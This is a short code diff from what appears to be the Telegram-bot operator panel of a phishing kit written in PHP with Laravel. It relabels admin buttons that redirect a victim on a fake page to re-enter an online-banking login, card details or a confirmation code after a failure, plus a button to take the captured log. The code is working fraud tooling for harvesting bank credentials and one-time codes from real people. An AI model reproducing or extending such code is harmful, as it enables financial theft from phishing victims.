@@ -109,11 +109,11 @@ class PagesController extends Controller
             $fake = $this->getFake();
             $keyboard = Keyboard::make([
                 "inline_keyboard" => $chat_id === BotController::groupAdmin('id') ? [
-                    [["text" => "Перенаправить /", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
-                    [["text" => "Перенаправить /banks", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /banks"]],
-                    [["text" => "Перенаправить /order", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
-                    [["text" => "Перенаправить /code", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
-                    [["text" => "Перенаправить /error", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
+                    [["text" => "⤴️ / (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /"]],
+                    [["text" => "⤴️ /banks (неверный лк)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /banks"]],
+                    [["text" => "⤴️ /order (неверная карта)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
+                    [["text" => "⤴️ /code (неверный код)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
+                    [["text" => "⤴️ /error (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
                     [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
                 ] : [],
                 "resize_keyboard" => true,
